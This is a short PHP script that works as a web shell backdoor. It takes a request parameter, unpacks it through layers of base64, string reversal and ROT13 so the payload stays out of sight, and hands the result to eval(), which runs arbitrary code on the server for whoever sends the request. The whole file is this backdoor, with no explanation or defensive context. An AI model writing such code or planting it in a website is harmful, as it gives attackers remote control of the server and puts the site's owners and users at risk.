<?php
$DS = $_GET['x'];
echo $DS."<br>";
if (!empty($DS) ){
    $DS = @base64_decode($DS);
    echo $DS."<br>";
    $DS = @strrev($DS);
    echo $DS."<br>";
    $DS = @str_rot13($DS);
    echo $DS."<br>";
    $DS = @base64_decode($DS);
    $a=explode("--", $DS);
    echo @eval($a[0]);
    exit;
}